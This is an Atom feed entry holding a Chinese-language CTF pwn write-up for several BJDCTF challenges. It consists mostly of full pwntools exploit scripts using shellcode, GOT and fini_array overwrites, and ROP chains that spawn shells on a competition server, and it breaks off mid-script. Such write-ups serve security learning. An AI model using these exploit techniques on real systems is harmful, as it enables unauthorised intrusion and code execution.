<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-05-25T03:56:16.569Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BJDCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/</id>
    <published>2020-05-25T02:24:25.000Z</published>
    <updated>2020-05-25T03:56:16.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盲打1-盲打2"><a href="#盲打1-盲打2" class="headerlink" title="盲打1 盲打2"></a>盲打1 盲打2</h2><p>都是一个c语言解释器，但是不能用<code>()</code>来写c语言，也就是不能调用函数，可以用shellcode的方式来写 orw flag,</p><p>原理参考<a href="https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/">对hello world的重新认识</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10002</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">orw = asm(shellcraft.open("/home/ctf/flag", 0))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.read(3, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.write(1, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.exit(0))</span></span><br><span class="line"><span class="string">print '\\x'+hex(ord(orw[0]))[2:]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orw2=asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c2c2c2c       </span></span><br><span class="line"><span class="string">        mov rbx,0x4b4d404a034a  </span></span><br><span class="line"><span class="string">        xor rax, rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c35352c2c2c</span></span><br><span class="line"><span class="string">        mov rbx,0x584f035058434403    </span></span><br><span class="line"><span class="string">        xor rax,rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        mov esi,0x0</span></span><br><span class="line"><span class="string">        mov eax,0x2</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x50</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,0x1</span></span><br><span class="line"><span class="string">        mov rax,0x1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\\x'</span>+hex(ord(orw2[<span class="number">0</span>]))[<span class="number">2</span>:]</span><br><span class="line">payload=<span class="string">'const char main='</span>+str(hex(ord(orw2[<span class="number">0</span>])))+<span class="string">','</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(orw2)):</span><br><span class="line">    <span class="keyword">if</span> i != len(orw2)<span class="number">-1</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">','</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">pause()</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">p.recvuntil(<span class="string">"(end with '@')"</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'@'</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.can_recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意地址写，故意栈溢出然后会调用<code>__stack_chk_fail</code>函数，修改<code>__stack_chk_fail</code>的got表为后门即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_I"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10081</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x4011EB)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404028</span>)+<span class="string">"\x00"</span>*<span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x40124A</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><p>静态编译了,fini_array劫持为onegadget即可，onegadget苦苦找寻了好久，找到了一个有效的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_II"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10102</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x46F37F)</span></span><br><span class="line">dbg(<span class="number">0x4B80B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x4B80B0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x46F37F</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另一种做法参考<a href="https://fmyy.pro/2020/05/23/Competition/DASCTF-May/" target="_blank" rel="noopener">fmmy</a>师傅题解</p><p>fini_array劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0]:__libc_csu_fini</span><br><span class="line">fini_array[1]:main函数地址</span><br></pre></td></tr></table></figure><p>之后则可以形成一个循环链,然后任意地址写,可以在fini_array[2]之后构建ROP链,最后再将fini_array[0]改成leave_ret,fini_array[1]改成ret执行后续ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(<span class="number">0x402CB0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line">pop_rdx_rsi = <span class="number">0x44BAF9</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41B380</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x448415</span></span><br><span class="line">syscall = <span class="number">0x46F745</span></span><br><span class="line">binsh = <span class="number">0x492895</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span>,p64(pop_rdx_rsi) + p64(<span class="number">59</span>) + p64(<span class="number">0</span>))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall))</span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory Monster III"></a>Memory Monster III</h2><p>这道题当时没有做出来，赛后参考taqini师傅博客，有学到了新的姿势</p><p><a href="http://taqini.space/2020/02/14/play-ROP-with-fini-array/#0x0-背景" target="_blank" rel="noopener">通过利用fini_array部署并启动ROP攻击</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_III"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port=<span class="string">'183.129.189.60'</span>,<span class="number">10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(<span class="number">0x402CA0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_rsi = <span class="number">0x44AB09</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41AE80</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x447635</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">mprotect = <span class="number">0x448420</span></span><br><span class="line">read = <span class="number">0x447620</span></span><br><span class="line"></span><br><span class="line">shell_a = <span class="number">0x4BC100</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span>,p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(<span class="number">0x200</span>) + p64(shell_a) + p64(read))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdi_ret) + p64(shell_a <span class="number">-0x100</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(mprotect))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(shell_a))</span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p>文件描述符最多有1024个，也就是说最多打开文件1024多次,就不能继续打开了,则随机值之后全是0,因此输入”\x00”字节就能通过memcmp检测，然后close(0)，memcpy栈溢出， 只能orw flag了，并且此题远程是2.30的。2.23本地调试的时候有点不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># --- auther nocbtm ---</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">pwn_name = <span class="string">"secret3"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10056</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.30-0ubuntu2_amd64.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx read size</span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi read canshu</span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x401433)</span></span><br><span class="line">rdi=<span class="number">0x40161b</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line">rsi_r15=<span class="number">0x401619</span></span><br><span class="line">bss=elf.bss()+<span class="number">0x300</span></span><br><span class="line">p.recvuntil(<span class="string">"name? ________________ #"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>+p64(<span class="number">0x4021df</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0x4021df</span>)+p64(rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">"open"</span>])</span><br><span class="line">payload+=cus_rop(<span class="number">0x401612</span>,<span class="number">0x4015F8</span>,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,bss,<span class="number">64</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(elf.plt[<span class="string">"write"</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1255</span>):</span><br><span class="line">    